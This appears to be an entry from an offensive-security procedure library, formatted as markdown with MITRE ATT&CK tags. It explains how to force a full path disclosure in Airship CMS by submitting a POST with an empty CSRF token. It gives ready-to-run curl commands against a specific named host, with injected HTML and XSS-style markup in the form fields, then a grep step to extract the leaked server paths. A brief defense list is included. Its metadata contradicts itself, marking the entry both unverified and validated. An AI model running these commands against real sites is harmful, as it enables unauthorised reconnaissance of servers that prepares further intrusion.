---
id: cfc80e06-11d1-4637-aa28-a8585507caef
name: Trigger-Full-Path-Disclosure-via-CSRF-Failure
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:03.579Z'
tactics:
  - '[[Reconnaissance]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - information-disclosure
  - csrf
  - path-disclosure
  - airship-cms
  - php
commands:
  - '[[commands/curl-post-csrf-failure]]'
platforms:
  - Web
  - PHP
tools: []
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Trigger-Full-Path-Disclosure-via-CSRF-Failure

## Summary

This procedure exploits a configuration issue in Airship CMS where debug mode causes detailed error messages to be thrown during CSRF validation failures, disclosing full server file paths. It is primarily used for reconnaissance to map the target's filesystem structure, aiding in identifying sensitive files or paths for subsequent attacks.

## Description

In Airship CMS, when the application runs in debug mode, failed CSRF token validation on endpoints like the author edit form results in exceptions that include full file paths in the response. By submitting a POST request without a valid CSRF token, an attacker can trigger this error and extract path information such as locations of PHP scripts, configuration files, or the web root directory. This information disclosure vulnerability provides valuable reconnaissance without requiring authentication, assuming the endpoint is accessible. The procedure targets PHP-based web applications and assumes the CMS is vulnerable due to improper error handling in production-like environments.

## Requirements

1. Network access to the target Airship CMS instance (e.g., via HTTP/HTTPS)
2. Knowledge of the author edit endpoint URL (e.g., /author/edit/{id})
3. curl or equivalent HTTP client for sending POST requests
4. Target application running in debug mode with verbose error reporting enabled

## Defense

Defensive measures and detection strategies:

- Disable debug mode in production environments to prevent detailed error messages
- Implement proper CSRF token validation and generic error pages that do not expose paths
- Monitor application logs for failed CSRF validations and anomalous POST requests to author endpoints
- Use web application firewalls (WAF) to detect and block requests lacking CSRF tokens

## Objectives

1. Trigger CSRF validation failure to generate an error response with file path details
2. Extract and analyze disclosed paths for reconnaissance on server structure
3. Identify potential targets for further exploitation, such as local file inclusion or path traversal

## Instructions

### Step 1: Prepare and Send Invalid POST Request

**Context**: Craft a POST request to the author edit endpoint omitting the valid CSRF token to force validation failure and expose the debug error with paths.

**Command** ([[commands/curl-post-csrf-failure]]):
```bash
curl -X POST https://bridge.cspr.ng/author/edit/7 \
  -H "Host: bridge.cspr.ng" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Referer: https://bridge.cspr.ng/author/edit/7" \
  -H "Cookie: __cfduid=any; PHPSESSID=any; cf_clearance=any-any-any" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_CSRF_TOKEN=&name=%3Cxss%3E&byline=&format=Rich+Text&biography=%3Ch2%3Exxxxxx%3Cbr%3E%3C%2Fh2%3E&_wysihtml5_mode=1&save_btn=sav"
```

> This command simulates a form submission with an empty CSRF token and payload intended to trigger the error. The response will include a stack trace revealing paths like the location of the validation script or CMS files. Review the output for lines containing absolute paths (e.g., /path/to/airship/cms/file.php).

### Step 2: Analyze Response for Disclosed Paths

**Context**: Parse the error response to extract and document the revealed file paths for use in further reconnaissance.

**Command** ([[commands/curl-post-csrf-failure]] with output capture):
```bash
curl -X POST https://bridge.cspr.ng/author/edit/7 [same headers and body as above] > response.html
```

> Grep the response file for path indicators: `grep -i 'path\|file\|line' response.html`. Successful execution shows server internals, confirming disclosure.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-csrf-failure]]

## Tools Used


## Tags

- [[information-disclosure]]
- [[csrf]]
- [[path-disclosure]]
- [[airship-cms]]
- [[php]]
